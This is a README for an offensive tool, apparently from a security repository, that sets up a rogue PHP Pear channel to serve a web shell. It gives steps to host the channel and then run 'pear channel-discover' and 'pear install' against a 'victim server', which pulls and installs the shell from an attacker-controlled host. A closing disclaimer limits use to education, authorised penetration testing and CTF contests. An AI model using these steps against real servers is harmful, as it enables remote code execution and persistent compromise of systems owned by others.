# Pear-Rogue-Channel
## About
Pear-Rogue-Channel is a custom, self-hosted PHP Pear channel that does one thing: serve a PHP web shell.
## How to use
1. Generate necessary files
```bash
./main.php
```
2. Move all files in `public_html` to the document root (such as `/var/www/html/`) of your web server.
3. Try to execute the following pear commands on the victim server:
```bash
pear channel-discover SERVER_HOST_NAME
pear install CHANNEL_ALIAS/PACKAGE_NAME
```
4. Viola!
## Advisory
All files and scripts should be used for educational purposes, legal penetration testing, and/or CTF competitions. Please don't use them for illegal activities. :cat: